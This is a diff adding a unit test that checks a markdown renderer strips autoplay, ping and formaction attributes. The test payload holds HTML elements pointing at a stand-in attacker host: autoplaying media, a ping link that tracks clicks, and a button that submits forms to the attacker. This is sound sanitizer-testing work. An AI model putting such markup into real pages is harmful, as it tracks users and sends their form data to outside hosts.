@@ -136,3 +136,16 @@ test('strips forbidden base, meta, and link tags from rendered markdown', () => 
   expect(out.toLowerCase()).not.toContain('<meta');
   expect(out.toLowerCase()).not.toContain('<link');
 });
+
+test('strips autoplay, ping, and formaction attributes from rendered elements', () => {
+  const payload = `
+<audio src="https://attacker.com/audio.mp3" autoplay></audio>
+<video src="https://attacker.com/video.mp4" autoplay></video>
+<a href="https://example.com" ping="https://attacker.com/track">link</a>
+<button formaction="https://attacker.com/submit">submit</button>
+`;
+  const out = renderMarkdown(payload);
+  expect(out.toLowerCase()).not.toContain('autoplay');
+  expect(out.toLowerCase()).not.toContain('ping');
+  expect(out.toLowerCase()).not.toContain('formaction');
+});
